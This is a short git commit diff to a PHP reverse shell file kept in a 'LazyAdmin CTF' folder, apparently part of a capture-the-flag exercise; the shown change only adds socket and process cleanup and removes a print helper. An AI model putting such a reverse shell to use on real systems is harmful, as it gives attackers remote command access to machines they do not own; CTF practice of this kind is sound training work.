7ef2882db7a2f9ac20ae116a1f85eb7f8cbcd1d2
OmDorugade <73012018+OmDorugade@users.noreply.github.com>
2026-04-05 14:32:48 +0530

    Update reverse_shell.php

--- LazyAdmin CTF/reverse_shell.php
+++ LazyAdmin CTF/reverse_shell.php
@@ -127,14 +127,10 @@ while (1) {
 	}
 }
 
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
 
 
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
-}
-
-?> 
